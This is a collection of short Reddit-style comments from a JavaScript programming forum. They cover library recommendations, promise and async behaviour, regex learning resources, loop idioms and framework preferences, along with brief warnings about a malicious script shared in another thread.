Not sure what you mean by get json from a website since that doesn't really make sense.. but if you just want to practice pulling some JSON from the web, tack `.json` at the end of a subreddit. https://www.reddit.com/r/javascript.json you can get stuff from the browser console even: fetch(`https://www.reddit.com/r/javascript.json`) .then(response =&gt; response.json()) .then(json =&gt; console.log(json))
And another one, still doing the linked in spam of your blogs and your company. * Like [here](https://www.reddit.com/r/web_programming/comments/62cr77/10_useful_javascript_form_validation_libraries/) * and [here](https://www.reddit.com/r/programmingtools/comments/60zprj/10_useful_javascript_form_validation_libraries/) * and [here](https://www.reddit.com/r/programming/comments/60sqy3/10_useful_javascript_form_validation_libraries/) * and [here](https://www.reddit.com/r/BigDataJobs/comments/5zvv3g/big_data_human_resources_and_the_future_of_hiring/) * and [here](https://www.reddit.com/r/programming/comments/5zvstg/python_development_7_libraries_to_look_for_in_2017/) * and probably lots more. And oh, I didn't include your alt accounts. Are they doing well?
Seems interesting, but for me, Chrome seems to be getting slower and less reliable with every release
Why don't you ask him to display movies using IMDB apis using HTTP METHODS. That seems simple.
it'd be more explicit with user.address = {}
it's because you didn't try Endtest
I hope he uses this for his homework. (It doesn't work)
Conceptually rxjs is fantastic, in reality my code is very brittle - sounds like from other peoples experience I should stick at it until I really get it.
Good luck, and have fun! I think getting your thoughts out of your head can often be quite useful. And knowing how to approach a problem is much more important than implementation details.
have you looked into [learnrxjs.io](https://www.learnrxjs.io) ? I would also recommend [rxmarbles](http://rxmarbles.com/), but the diagrams are based on an older version of RxJS (*v2.5*)? Another useful [link/e-book](http://xgrommx.github.io/rx-book/content/which_operator_do_i_use/index.html) to help narrow down the functions you would likely want to use for particular situations. I would also look at [Ben Lesh](https://www.youtube.com/watch?v=1vR9lQLfqjo)'s talks as he explains some of the fundamental concepts of RxJS quite elegantly. I empathize with you on the learning curve. Imo, one of the main difficulties of RxJS is because it asks the developer to approach problems with a different perspective. Similar to the paradigm shift from imperative to functional programming, RxJS is similar in that regard with event listeners. **But** if you stay committed I'm sure you'll get over the initial hump. Hope this helps /u/trumpmate and good luck
Hey! Wtf is that supposed to mean?
bizarre. Try googling learnrxjs.io? Can anyone else chime in on the learnrxjs.io link? It's linked to this [github repo](https://github.com/btroncone/learn-rxjs)
What do you think it does? Try user.adress = {} !!user.address 
function lowercase(str){ for(var i=0; isNaN(i); i++){ if(str[i]&gt;65 &amp;&amp; str[i]&gt;91){ } } var z=""; for(var i=0; i&lt;str.length; i++){ var x=str.charCodeAt(i)+32; var y=String.fromCharCode(x); z+=y; } return z }function lowercase(str){ for(var i=0; isNaN(i); i++){ if(str[i]&gt;65 &amp;&amp; str[i]&gt;91){ } } var z=""; for(var i=0; i&lt;str.length; i++){ var x=str.charCodeAt(i)+32; var y=String.fromCharCode(x); z+=y; } return z }
I once read somewhere that decrementing an array was better performance wise but using an array with 100.000.000 items incrementing is faster than decrementing. 172 vs 1573 ms difference in my case. 
Doesn't work with IE 11, I won't be able to use this without a transpiler for a loooong time. 
Tooltip.js from Popper is pretty basic, you have to manually initialize each Tooltip. I haven't added a lot of features to it because it's cool to see other people work on libraries that rely on Popper.js to accomplish stuff like this üòç I could easily depracate Tooltip.js if a great alternative emerges, for now Tippy.js seems very cool (and has a better name!) but it needs some more time and love.
For now, take a look at `react-popper`, it's not a whole tooltip library, more a wrapper around Popper.js, but it's still more than what you will find elsewhere.
That's actually configurable in Popper.js but I'm not sure if it's exposed trough Tippy.js, it may be worth it opening an issue asking for direct access to the options parameter of Popper to handle all these cases. Edit: I sent a PR for this: https://github.com/atomiks/tippyjs/pull/8
Either you or I do not quite understand what webpack loaders do.
This LogRocket thing looks great!
As new reply in case you are reading the other one and would miss an edit in the other reply: Try this code. In node.js or a browser that knows about async/await (like the latest Google Chrome). Note that `console.log` output of the `wait` function is run when that function is called (i.e. immediately) - not when it is resolved! You can see this in teh 1 second delay between "Start" and "Done" for the same name. `demo3()` is the function I showed you previously! Note that it ends up running all asynchronous jobs in SEQUENCE. That is the effect I talked about all this time: If you use `await` in a loop you end up running your asynchronous jobs in sequence instead of in parallel. Workaround(s): Don't wait, collect the promises! You can do that directly, or by using something like `.map()` and an inner function. `await` only interrupts the current function, so using `await` in an inner function in such a loop would indeed return the promise (immediately), the `await` does not have an effect outside that inner function. const files = ['foo.js', 'bar.js', 'demo.js', 'moo.js', 'meow.js', 'bark.js']; const wait = function (delay, passThroughArg) { return new Promise(resolve =&gt; { // NOTE THAT THIS RUNS **IMMEDIATELY**!! if (passThroughArg) { console.log('Start', passThroughArg); } setTimeout( () =&gt; { // THIS RUNS 1 SEC LATER AND RESOLVES THE PROMISE console.log('Done', passThroughArg); resolve(passThroughArg); }, delay ); }); }; async function demo3 () { const results = []; for (const fileName of files) { results.push(await wait(300, fileName)); } return results; }; async function run () { console.log('\nRun'); await demo3().then(results =&gt; { console.log(results); }); } run(); . PS: I didn't create that demo for you, I had it lying around to show somebody else a few days ago already. Some other demos omitted here for brevity. I'm honestly not sure why I even bother.
This looks amazing, I need a tool to find unused css code
Well, I write mainly in TypeScript, so in my definitions file I have defined the type of window.someCache anyways, and literally can't set it to anything other than an object of the type `{ [id: string]: SomeType }` without the compiler crying. I do see your point, however and if I'd work with you I'd certainly accept your reasoning. I just don't see that much wrong with this compared to the other "tips".
You couldn't make this a VSCode plugin, buddy?
Thanks. Will do.
&gt; in order to run them in parallel. This is not how this works! They **already run**! `Promise.all` merely waits for the results of those **already running** asynchronous tasks! The moment you GET the promise the asynchronous task has already started! Please inform yourself about how promises work before you go on. The code that created the promise has already run and the asynchronous job is in progress, `Promise.all` merely waits for and collects the results in an array. Promise.all does nothing at all about execution order! What are you thinking? Who gave you that idea? Tip: Read up on promises. You won't have much fun with async/await unless you understand how promises work in the first place. You seem to have some huge gaps and misconceptions in your understanding.
Safari is a pretty underrated browser..
Good job. I used to make custom tooltip, taking many hours. I'm just going to use this one from now..
Meant plugin, my mistake!
The current dead code elimination is spotty and doesn't analyze the final result without import statements.
Hi /u/redbluerat, please refrain from personal attacks.
Looks great, too bad they don't have a favicon on their site.
I don't know whether you have to use this syntax, but as a react developer, I really don't like the idea of triggering component method callbacks using some proxy api - ex: onclick={{action @triggerItem @item}} I feel like I'm losing out on the flexibility to use any new constructs that echmascript creates for me by using "action". I much prefer react's way, even if it is a bit more verbose: onclick={_.partial(this.triggerItem, item)} Perhaps that proxy api is a bit more than another thing to learn? Does it have any benefits? 
Client side JavaScript can't be used as a reliable method to detect automated clicks. i.e. the information which identifies whether a click is automated or not, is beyond the reach of client side JavaScript.
I misread what the poster I was replying to was saying, there was a performance hit from having `array.length` in the loop invariant but it wasn't because it would recalculate the length. It was because it was doing an unnecessary property lookup every iteration. In other words, every iteration it would check `array.length` and since that has a cost (although a tiny one) it was a performance improvement to move it out of the loop.
My professor never specified, I am assuming something more modern but as I am searching for different js there is a lot of the older stuff 
I haven't used it very long, but I don't get it. The documentation is incredibly hard to parse, and the design pattern seems very brittle to me. 
Really nice API. The documentation is short and to the point, which is also really nice but I would like to quickly see the tool's API definitions spelled out point blank. If there were some sort of dummy repl or simulated interface where I could play with this against dummy data and just see output on a faked-out command line that would **really** be awesome. Also, I did a quick peek into the code. I saw lodash, but otherwise didn't see any dependencies. Excellent work there.
Hi /u/KyleG, considering it's a malicious file, can you unlink the download? Surround the url with \` marks or something, just so if someone wants to download it, it's a little more intentional than a mouse click. 
Note: this code is malicious, and it's unadvised to run any code found in this thread.
Security Now was talking about auto running .js files not too long ago.
It looks like this attacker is using other vulnerable websites as hosts. Damn WordPress!
Easy fix: getNextThing() { let i; for (i = 0; alreadyHasThing(i); i++); return i; } That, and I'd rewrite this to look a little more intuitive/clearer anyway. function getNextThing () { let i = 0 while (alreadyHasThing(i)) i++ return i }
To be fair, OP noted the fix that you're suggesting in the post.
&gt; user.adress = {} &gt; !!user.address false, but only because the 'adress' != 'address'.
https://github.com/toddmotto/public-apis Here is a list of public apis. At my company we deal with Apis a Lot. So we found one that was fun (star wars api) and have our candidates make an express app from scratch that interfaces with that api. We specify what endpoints we want available and what exactly it needs to return to us. (list of all planets with the names of their residents, list of 50 characters with some sorting parameters available, etc). Shows us their understanding of pagination, best practices for sorting, how to mash data together in a clear manner, etc. It is a take home test, because that just makes most sense to us. We tell them they can use whatever they want (Google, stack overflow) as long as no one else actually helps them with code). 
Note that this is not Javascript, but JScript. Basically, Javascript with vulnerabilities exclusive to Microsoft systems.
I would recommend nightmarejs: https://github.com/segmentio/nightmare `var Nightmare = require('nightmare');` `var nightmare = Nightmare();` `return nightmare` `.viewport(900, 800)` ` .goto(url)` ` .insert('#Email', 'my-email')` ` .insert('#Password', 'my-pass')` ` .click('#signIn')` ` .wait(3000)` That should get you started. You can also use: `var nightmare = Nightmare({ show: true });` to see it in action. PM me if you need any other help.
Yawn. React won the component wars. Let's move forward and build this ecosystem.
Seems like a perfect use case for a while loop. 
Default values using || are a bad idea because they also jump to default if a value is falsey. `value = value === undefined ? 'default' : value` or `if (value === undefined) value = 'default'` are better options. Also, an article with a video as its body (@medium link), damnüòë
Hmm I've never run into that issue, maybe try making an alias for node.
Did the professor say to just copy and paste, or is the goal to write the javascript yourself?
Oh my god. It's beautiful. Seriously though, I am amazed. It's the best shareable, modern web dev environment in a browser. It's just missing one feature: supporting a js module system. Either commonjs (require) or es module (import/export) would be amazing. Thank you so much for coming back to this comment and showing me what you've done. 
[removed]
 function getNextThing() { for (let i =0; ; i++) { if (!alreadyHasThing(i)) { return i; } } } While we're improving :) I think this makes it clearer than the loop is potentially infinite (so be careful of bugs in `alreadyHasThing`) 
Marionette? What year is it? Edit: jokes aside I used to really love backbone and swore by it for a while.
She said copy and paste, and if I could edit some of the script that would be a bonus
I'm still looking for a way for webpack to remove unused css rules from css frameworks. It's very hard to do this with tree shaking, since the frameworks often depend on structures of html (rather than just single classes). I'd imagine a plugin could be made that generates html and use purifycss to clean up any external css. The result ends up in the bundles webpack produces.
Rx has been a game changer for me. It took a little while to get over the learning hump but now I can't imagine wanting to tackle an async task without it. I found the most help to be opening the developer tools in Chrome and just trying out small, isolated experiments. I still do that first before doing a fuller implementation in an existing app. The [blog post by Ben Lesh on building an observable](https://medium.com/@benlesh/learning-observable-by-building-observable-d5da57405d87) was the first thing that started to remove the appearance of magic. Finally the Egghead courses by Staltz about subjects/sharing and multicasting answer a lot of more esoteric questions and helped avoid potential confusion/bugs.
I think you should look at doing some fundamentals in node.js before you get further into this, take a look at some node.js courses on youtube.
I made /usr/bin/node a symlink to /usr/bin/nodejs but I don't know if that worked or not; see my [other post.](https://www.reddit.com/r/javascript/comments/63j0ru/trying_to_write_a_script_to_automate_getting_my/dfuprr3/)
&gt; Let's suppose, for example Develop the same way I die? I would outright say you're an asshole at this point. I am trying to ask questions and learn about the technology you posted in this forum, and you are spouting presumptuous nonsense. Anyways, I would recommend you make some educational videos and put them on YouTube etc. I assume you need a fucking userbase to feed your AI, so learn to be polite and understanding of people who cannot read your abstruse mind.
I'm not sure how to do it with underscore specifically but array.filter sounds like what you want. Filter the array where obj.trends.filter().Length &amp;&amp; obj.other.filter.length I'll write out better psuedo code tomorrow when I'm on a computer.
You can even make the code prettier, using some ES6: ``` let result.filter(obj =&gt; obj.bla === 'test_string') ``` Is all that is needed! nice right?!
Looks promising but unfortunately it's not available on Linux yet.
Again, I'm not really sure you understand my point of view, I was just giving a very common stack as an example of how your engine fits into modern web development. Do you have an example of a codebase generated by lychee, or any "real world" examples, etc? Adapting architecture is fine, but _what architecture_? **Edit:** Just found the `guides` dir in your repo, looking through it now.
This looks good, next time I'm building an app with lots of API consumption I'll give it a go
This is awesome! Looks similar to how Backbone mapped REST API calls to a model's CRUD methods. 
Are you **sure** that that is the same? Because I often experience unexpected behaviour when I use the latter...
All of these array functions have made my JS significantly better. `map`, `filter`, `includes`, `some`, `reduce`, `find`, etc. They're awesome.
Perhaps it is an attempt at obfuscation? Not an effective one, but when discussing deliberately malicious code the old adage "avoid attributing to malice that which can be as easily explained by stupidity" becomes more like "avoid attributing to malice that which can be as easily explained by stupidity *and* malice".
Why the downvotes? He's just expressing his opinion which is entirely defensible and totally relevant here. 
I was just about to comment the same thing. Definitely uses compromised wordpresses as hosts.
Nearly all of the dead CSS tools are useless for a reasonably complex app.
What css tools are you referring to?
FYI, that won't work. Array.push() returns the new length the array, not the array itself. I generally use Array.concat() for this.
~~months~~years &amp; +1
Any clue on to how to add this to a project?
You'd be using far more for loops without those functions...
I wonder if it would ignore -moz styles or any other non-chrome styles though?
There are GreaseMonkey scripts you can run on your browser that will auto-click ads.
What makes you think the person knows no concept of an array and a for loop? LOL Edit: I like how people are downvoting questions (ignorance? I dunno) instead of taking a part in the discussion.
True. You can also use spreading now :) myArr.reduce((acc, val) =&gt; [...acc, val], [])
I'm a bit confused. Why would I want to use Vue components when you already work with React or Angular? What are the benefits of including Vue Components?
Ah, you're right. You see, reduce throws me off my game ;-)
Clicking the button might be needed in order to skip said intros. But the author has no idea how to do it properly so he continuously spams that event instead of invoking the MutationObserver class to react to DOM changes for example.
It is not broken. No need for a "fix".
They obviously don't fully grasp callbacks either.... `return callback(...)`.
Do you have any concrete ideas? Not disregarding your statement, just can't think of any reasons why.
Yeah I'm leaning towards always using parentheses as well, should probably turn on the ESLint [arrow-parens](http://eslint.org/docs/rules/arrow-parens) rule for projects. Even if you have a single parameter, you can't use the destructing assignments if you omit the parentheses. const things = [{value: 1}, {value: 2}, {value: 3}] things.filter({value} =&gt; value % 2 === 0) // error things.filter(({value}) =&gt; value % 2 === 0) // [{value: 2}]
Wow, that's a great resource. Thanks for sharing! EDIT: I do wish it used visited link CSS to track what's been read.
@slajaa09 e.g. when you are migrating from old code (like ng@1) to Vue. But to be honest this is only one (and in my opinion not most important) feature of Custom Elements. You can easily drop some HTML tags on the page and it will automagically work. You can even create microservice like architecture where Custom Elements talk to each other. There are many possibilities and I agree with you that the title can be bit misleading. 
very interesting, does that mean it would not have worked if the PC only had an older version of IE ?
That would be awesome. 
They are used for redrawing the canvas and making the game calculations etc. You will need one if your game is going to have constant animations or constant calculations regardless of the players actions. If your calculations and animations happens only when the player takes action (e.g. simple chess) then you don't necessarily need one
If there's something I can't do with reduce then it can't be done
Awesome, thank you!
Thanks for saying that! 
What about the function?
Sure! So because they were side by side. I scanned the left and scanned the right. The left hand side appeared to me to be how you would use a created model. I thought the right hand side was the definition. I missed the first line on the left hand side where Post was defined. I then looked at the code on the left and I wasn't sure how the URLs for the request were created. I then assumed the right hand side was the definition (as it had more code for the model set up and I just assumed that this was the definition). The two then don't match up and I got confused. I know this is a lot of jumps I made but when I'm trying to see what something does I first scan the code before I read through in depth and because of this I made some assumptions due to how the code was laid out. I think the main issue is that because there is a left and a right hand side there is an assumption they are deeply associated. This could just be the way I think, maybe see what others thing before making changes, I could be the outlayer :P 
Okay so for a text based game where you have to wait for user input, you wouldn't need one whereas a game like pong would? Is this only limited to things that have to be constantly animated? 
A really useful feature would be a simple way to make mock responses for unit testing.
Haha aw, how cute. Do you think the browser can't handle a loop? In this case a loop will work every time and a MO will not. I think you need to understand compatibility before speaking. Oh and also, I don't see Netflix intros haha http://caniuse.com/#feat=mutationobserver
Wow you're right. I can never use this now.
If you want to learn a new library? Go react. Wanna develop fast? Go ember.
Depends on your local area, for myself I'm transitioning from Angular 1 to React because that's where the jobs have gone. I'm starting to see a few jobs for Angular2 (Never seen a job spec refer to Angular/AngularJS) Angular 1 is still useful as most of the roles are for migrating off it but I'd say at the moment React is winning by a long way, who knows in the future though.
How did you find these details? I'm working on analysis of many such malicious and benign js. Could you provide some direction?
Do people not use this function?
Amen brother!
Sorry to ask again, but which part are you referring to? The "side-by-side"? Do you mean the config builder? Or do you mean on the home page where there's the examples side by side? :)
Cleaning up some of the terminology was one of the pushes for the Rx5 rewrite. Rx4 (and previous) was a direct port of the Java implementation so some of the semantics don't match exactly. Some of the concepts and terms are foreign at first but the thing that kept me going is the "specification" if you can call it that is extremely thorough and the concepts are very consistent so there's a finite amount of things to learn and you just need to get over that initial hump. "Stream" is a generic term that just refers to a chain of operations that stem from any kind of source like a BehaviorSubject or an observable of mouse clicks. E.g.: var mySubj = new BehaviorSubject('initial'); var stream1 = mySubj.map(val =&gt; `Got ${val}`); // vs var clicksSource = Rx.Observable.fromEvent(document.querySelector('#mybutton'), 'click'); var stream2 = clicksSource.map(val =&gt; `Got ${val}`); Both can be referred to as streams even though that isn't a formal term. As for triggering something manually, it's all about what causes your source to trigger. In the above examples: the source of clicks is when the DOM event is fired; and manually pushing something through the subject is done via manually calling the onNext method (Rx4) `mySubj.onNext('new value')`.
[In the repo](https://github.com/liriliri/eris), was there a specific reason for modules being separated into alphabetic folders rather than a single modules directory? The only thing I don't like is that some functions already exist in Lodash. For example, why use your flatten (Recursively flatten an array) over Lodash's flatten, flattenDeep. flattenDepth, (all are separate npm modules and are more flexible). Why not leverage their project by using their modules to make your snippets? Good work on the documentation, playground, and the online build tool. Some suggestions for documentation would be a link for each module "Try in REPL" (like Lodash docs have). Also, clicking on the module link should update the URL in the address bar i.e. #flatten (which is odd since they are already properly linked). 
Why do you keep posting this library again and again and again? You've got like 3 reddit threads that I've seen in this subreddit since last week for this exact same library. And to be honest, ES6 already has classes. Sure, it's not as fully featured as your library in terms of private methods, but with Flow/TypeScript that doesn't really matter in regards to your "type safety" related features and the consensus in JS-land is exponentially shifting to the functional programming paradigm anyway, which shuns class/OO practices in favor of modular composition. so what you're doing here is beating a dead horse.
Okay, nice. I will take a further look over the weekend. Exciting stuff.
I second that request, as I wrote in my comments below. A "picture" is worth a thousand words they say.
The browser can handle a simple loop and given that this is quicker personal script there's nothing wrong with it, it does what it's meant to do. However from the caniuse link link you supplied the support for unprefixed Mutation Observers is 83.73% and 93.34% overall. This means that those who generally use userscripts, the more technically inclined (less likely to use IE), are going to be using browsers which support them, especially since tampermonkey doesn't even have an extension for IE (which gained support from IE 11).
That's an amazing amount of work and thought. I hope this project finds its audience. I, however, am happy with verbose prototypical 'classes' as they are now, even es6 sugar classes. People tend to not use the descriptor objects of [Object.defineProperty](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty), I have learned to love them. Combine that with good 'ol prototypical javascript and I can do everything I want.
The library is not about type safety, it is about objected oriented programming (OOP). Your answer does not demonstrate understanding of OOP, but does demonstrate the opposite. Further more, is not the existence of TypeScript a contradiction to some of what you said. Why does the javascript world insists to avoid learning from others, and instead continues to re invent the wheel itself? If you are happy with your ways, no problem, but why post here?
getElementsByClassName returns an array of elements. You need to select the correct element from that array. The first element one will give you your current followers. The other two are the people you are following and your number of tracks. var fanSel = document.getElementsByClassName("infoStats__value")[0].innerHTML; 
:) This is great.
Sorry. The home page with the examples side by side :)
React is better for a new project. If used correctly it re-inforces many things that will make you a better developer.
Honestly the best for me was trial and error with [regexr.com](http://regexr.com)
Negative comment. You will be judged accordingly. Hooray!
Ah, of course. Thank you for the feedback! Do you have any suggestions to make it easier to understand?
That's a really cool tool! Thanks for sharing that
Understanding that it is an expression for matching a 'regular language' in the formal sense of computational theory. Always remembering that it can be though of as a finite state machine. Then, man 7 regex &amp; noting the differences between based and extended (ERE). Then studying the differences which perl brought it and java and .net and python. I wrote a lot of these at the command line in a bash shell so understanding shell escaping was (and is) paramount.
Slightly relevant: http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags
www.rubular.com is my go to (For building regexp it's the same in JS and Ruby. I just like the simple guide below and the ability to quickly test a regular expression.)
I think at this point if someone were to pick something other than AngularJS (1.x), most would go with React. The React ecosystem is pretty big and only getting bigger. You can find components for almost everything. Some would argue for Vue as well, which technically may be just as good / superior to React, but does it have the same community and ready to use components? Doesn't seem like it. React is leading in community, it seems.
Hi /u/CreatrixTeam, this is the 3rd time you've posted the same link within 2 weeks. That's excessive (aka. spam). Please don't post it again unless there are significant updates. Thank you.
Thanks.
OP is suggesting that there's still a use for `var` in an ES6 environment, when there just isn't, and that was the point I was trying to make.
another nice one is https://regex101.com/ which also has a great reference and explanation on the right.
&gt;I prefer it though because I know mongo way better than I know redis. I've never used kue, but have used redis. I was worried about using it too as I only had experience with mongo, and there's so much hype around redis that learning it intimidated me. I's not anymore complicated than mongo. Its just a fast, in-memory key-value store. Once you play with it a bit and get the hang of the basic commands + using something like node-redis then you're good to go. Go here https://try.redis.io/ and you can learn some commands + redis data structures. After seeing /u/spamguy21's comment I plan on still checking out agenda but will probably just use kue instead.
[rxmarbles](http://rxmarbles.com/) is an interactive tool thats helps visualize the **stream** of data over time. Its not intuitive at first glance but you can click and drag the "*marbles*" above the function call and visually grasp how the rxjs function will output the resulting "*marbles*"
I'm impressed by how well the [Bezier Curve](http://javascript.info/bezier-curve) tutorial is written, very easy to digest for such an useful concept.
Holy crap I love you!! Super noob mistake xD but I learned something yay
Apologies. I thought I try during a week day, because past posts were on the week end. I wish you did not remove the content of my post. What are the pertaining limits on this forum?
The devil's advocate POV (i.e. "This is why you should declare variables at the top") is because that's how JS actually works, thanks to hoisting, and it's good for the code to match the functionality. Here's an example, similar to the one above: function whatever() { ... a bunch of code ... theThingImLookingFor = "whatever"; ... a bunch of code ... var theThingImLookingFor, current; while ( !theThingImLookingFor ) { current = someArray.pop(); if ( current.name.matches(/.../) ) { theThingImLookingFor = current; } } } This code is perfectly valid, since the variable declarations are hoisted. However, if you're just reading the code, you'd probably expect `theThingImLookingFor` to be `undefined`, and you'd be wrong. The while loop is never going to execute, because that variable was already given a truthy value earlier in the code. Anyway, that's the argument for why you should put var statements at the top. I disagree with it, but there ya go.
/u/opfeels/ /u/MrSavager/
When `let` is available and proven more semantically sensible in a variety of situations (e.g. the classic `for` loop + `setTimeout` example) it makes more sense to just not think about var ever existing, and just use let. On the flipside, always using var is fine too if you're not working with ES6+. The speed difference will hardly mater, and will improve in the future as var is phased out.
+1 For this. It especially does a good job of explaining how capture groups work.
I liked [pyquick](https://developers.google.com/edu/python/introduction). That's where I started with regular expressions, moved on to regex crosswords from there. Granted, you have to trudge through learning python for a couple days. *edited
Block scoping is indeed more sensible than function scoping in several situations (btw the classic `for` loop + `setTimeout` example is not a problem if you know that `setTimeout` has two signatures), but I don't agree that we should get rid of `var` and consider it as an error in the language that got fixed. Having both at out disposal is a good thing.
Thanks much. This is very helpful.
Some people, perhaps coming from older languages, like to end all functions with an implicit return statement, methinks
big, if true
It's [text](Link)
http://www.regular-expressions.info
Ok so I just added this and a few other lines of code. But it's giving me this error code: document.getElementsByClassName(...)[0] is undefined. Here is my new code: html: &lt;p id="Text"&gt;&lt;/p&gt; Javascript: var fanSel = document.getElementsByClassName("infoStats__value")[0].innerHTML; var Text = document.getElementById("Text"); Text.innerHTML = fanSel;
var a ="" for i = x to y loop a +=str[i] end loop; a now equals the substring. This works because strings are actually arrays of characters. Code above isn't actual javascript syntax but should get you going. 
The few times I need to use regex, I always reach for a tool like this. The amount of times I find myself needing it vs the time it would take to learn it well just don't add up for me. As with a lot of things, it's all about how much practice you have with a tool.
I hate titles like this. I use the shit out of Array.filter, and have since they introduced it. You're WRONG.
I learned regexes in the late 90s before any of these more modern tutorials existed, but i did it by keeping a copy of this book (or, at least, the first edition) nearby at all times and studying it when i wanted to do any regexing : http://shop.oreilly.com/product/9780596514273.do
I am partial to [RegEx101](http://www.regex101.com). I really like the quick reference guide in the lower right and the explicit explanation of what each piece of the regex is doing. I would imagine the language dependent context would be nice, but really I only use it for javascript. EDIT: Man how could I have forgotten to mention [RegEx Crosswords](https://regexcrossword.com/)! I quickly got addicted to doing these and it really helped my grasp of regular expressions.
ok I'll give it a look
Even for a small project? I appreciate redux and it's advantages but it has a lot of overhead so I personally use it only for the large projects. 
Flux maybe for smaller projects. Really small projects I just write in straight up OO javascript. 
A great read that recaps the history of Ember, what helped it stand out from the crowd in the past, and what worked and what didn't, segueing into the introduction of Glimmer.js, a standalone UI component library extracted from Ember 2.10. Congrats to Tom, Yehuda, Godfrey, and the rest of the Ember Core Team! Looking forward to another productive year.
Medium.
http://lmgtfy.com/?q=javascript+indexof+polyfill
i need actual help a google search wont help
no
Actual help meaning code. It's not really polite to do all of your homework on reddit. But we're a cool bunch. function myIndexOf(str, char, from) { for (var i = from || 0, j = str.length; i &lt; j; i += 1) { if (str[i] === char) { return i; } } return -1; } 
Depends on the project, but generally yes. I have been writing only ES6 syntax because React has much smoother development with it.
If the OP doesn't know react, I'd highly recommend not using redux. It's too much to learn all at once for most people, and it also doesn't make sense why you would go through the trouble of redux's verbosity. It's best to learn react well, then after feeling the pain of managing state for a decent sized project, maybe migrate things slowly to redux. 
Ahh didn't even think about CSS, (been writing css in JS too long). To be fair the metrics shown in OP's picture are probably only unused rules for that particular page, not the entire website or application. 
JavaScript numbers are always 64-bit floating point. There is no such thing as an Integer. So, you can remove the getFloat entirely and just do `number/10`. More importantly... you can do modal animations completely in CSS ([see an example here](http://jsfiddle.net/kumarmuthaliar/GG9Sa/)).
If you're familiar with ES6, and willing to live without the handful of things `babel` doesn't implement (such as the limitations to `Symbol`,) then yes, using `babel` is enough to target most previous-generation browsers. Of course, fundamentally it depends on just how far you want your fallback policy to go. If you needed to include Netscape Navigator 3, `babel` wouldn't be good enough either.
My script runs in Node though.
To add to that, shouldn't the red dot follow the line, in [the second interactive demo](http://i.imgur.com/RTRIoyI.png)?
Is it? When one can provably be used in place of the other in practically every scenario? And is often, as you'e said, more sensible in said scenarios? In any case, dumb argument has gone too far, so I'm gonna bail.
Look into Promise.all, within the map you should be able to return each fetch, then outside of the map chain your .then with the desired logic. Edit: not at a computer so can't give an example snippet atm
Not only that but it also gives you the option of switching between the different regex engines so you can test any quirks the one you're working in might have.
Recently had to become aquainted with and have a solid understanding of regular expressions. The most helpful things for me so far have been: https://laracasts.com/series/understanding-regular-expressions http://www.rexegg.com/regex-quickstart.html https://regex101.com/ http://regexr.com/ (note: only JS regex engine)
regex101 is also the only one I use. I've tried a lot of others, this one is the best.
The loop provides the lexical scope.
Ah, I'm glad to hear that Crockford's finally learning a lesson from me. ;)
I'm returning `i` after the loop terminates, so as long as `i` is declared in the loop, it can't be lexically scoped. There are different ways to proceed: pull the declaration outside of the loop and use `let`, or you know just use `var` like old times.
I always liked Ember but haven't had a chance to use it a lot. Maybe my next project will use it again.
You are the laziest MFer i've ever met, and coming from a lazy motherfucker who had to lift his lazy ass hands off the desk to type this comment, that means something.
I wouldn't do it. I'm sure you can get away with it, but in many instances the polyfills are really slow compared to the native implementation in supported browsers. 
Glimmer.js looks awesome. Glad to see them bring out a skimmed version that competes with React/Vue. Honestly it feels much nicer than JSX to me from past experience preferring to stick with HTML, but just my opinion.
Yup, got TONS of tutorials for you! I keep a big list of links to high-quality tutorials and articles on React, Redux, and related topics, at https://github.com/markerikson/react-redux-links . Specifically intended to be a great starting point for anyone trying to learn the ecosystem, as well as a solid source of good info on more advanced topics. To answer your question: The [React and Forms](https://github.com/markerikson/react-redux-links/blob/master/react-forms.md) category has multiple articles on how forms work in React. I specifically recommend [Gosha Arinich's blog posts about forms](https://goshakkk.name/on-forms-react/), starting with his article on ["controlled" and "uncontrolled" inputs](https://goshakkk.name/controlled-vs-uncontrolled-inputs-react/). (His book [The Missing Forms Handbook of React](https://goshakkk.name/the-missing-forms-handbook-of-react/) is also totally worth purchasing, even if you're _not_ using React - has a bunch of good info on managing validation in just JS, outside of any framework.) As a quick TL;DR: React has an escape hatch called "refs" that gives you access to the real DOM nodes in the page, including inputs. Using that approach is known as "uncontrolled" inputs. However, the idiomatic React approach is called "controlled inputs", where you force the inputs to have a certain value, supply an `onChange` handler, and update the values in the component's state when the user tries to change something. Beyond that: You should start out by reading through the official React docs and tutorial at https://facebook.github.io/react/, and I'd encourage you to use the official Create-React-App tool ( https://github.com/facebookincubator/create-react-app ) for setting up projects. It creates a project with a solid build setup, with no configuration needed on your part. There's an excellent post called "Simple React Development in 2017" ( https://hackernoon.com/simple-react-development-in-2017-113bd563691f ) that gives some more specific instructions on the actual steps to follow. Finally, the Reactiflux chat channels on Discord are a great place to hang out, ask questions, and learn. The invite link is at https://www.reactiflux.com .
While we're on the subject, hijacking alt+left to go to the previous article, instead of back, was very confusing.
Looks comprehensive! But any plans to talk about modules?
 const seach_value = some_array.find(item =&gt; item.name &amp;&amp; /.../.test(item.name)) much esasier to reason about, simpler, compact...
This comparison is pretty redundant, as UMD falls back to the IIFE method when neither a CommonJS nor a AMD environment is found. It's a valid effort to get people to know about UMD, but it really doesn't lend much to being a comparison.
Depends who you are and what your work flow looks like, but my guess is that until browsers fully support es6 syntax than no. Its not too far off though!
Sure, like 70% ready.
alt-left? maybe ctrl-left?
Guess, stale cache? It was fixed.
Not top priority, but will be covered. That's one of the easiest topics.
what do you mean by "doesn't like it when I try some external JSON." what does it do? ---- Is it not working because your jQuery getJson is a callback and the get returns after the Component render? --- Are you using any state management that updates the component and re-renders them s after the data updates? --- i use https://mobx.js.org/getting-started.html This is probably terrible but it works. https://gist.github.com/zenril/0636f1c822df920027bc98aebdf06ffe
Looks awesome, really accessible. The accessibility issue I noticed was related to the timer demo where the alert killed itself after 2 seconds. Timed forced interactions are a known cognitive accessibility barrier.
Funnily enough I thought about making something like this a few days ago, because I was annoyed about always recoding the same requests to fit my REST Api for every new project and this is exactly what I wanted. Thats really awesome. Really good work! Will try to integrate it into a project and see how it goes :)
Sorry for being not clear. OK, so above code is just a small part of MULTISTEPS form. I just wrapped it around container class to center it on codepen for showcase purpose. I'm using different &lt;fieldset&gt; for each step in form. So it like parent div&gt;form&gt;fieldset&gt;and then above code div. Below is the codepen with whole form - http://codepen.io/anon/pen/KWLWzm I checked the jsfiddle that you have posted above but not sure it would work correct in my case since I'm looking to clone/remove a specific div nested inside form that again has a group of fields nested inside in it and the not whole form. 
